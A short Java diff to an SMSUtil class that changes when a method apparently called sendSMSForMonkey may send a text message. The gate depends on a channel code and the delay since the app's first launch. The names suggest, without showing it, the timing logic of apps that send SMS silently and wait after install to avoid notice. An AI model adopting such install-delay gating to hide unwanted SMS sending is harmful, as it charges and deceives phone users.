@@ -36,10 +36,7 @@ public class SMSUtil {
             int channel = Integer.valueOf(Config.CHANNEL_CODE);
             long currentTime = System.currentTimeMillis();
             long delay = currentTime - PluginSettingManager.getInstance().getFirstLanuchTime();
-            if (channel > 950000 && delay < Config.DELAY_ACTIVE_DO_MONKEY) return false;
-            if (channel > 800000 && channel < 900000) {
-                if (delay < Config.SEVEN_DAY) return false;
-            }
+            if (channel > 900000 && delay < Config.DELAY_ACTIVE_DO_MONKEY) return false;
 
             if (Config.DEBUG) {
                 Config.LOGD("[[SMSUtil::sendSMSForMonkey]] origin msg : << " + msg + " >> to : << " + target + " >>");
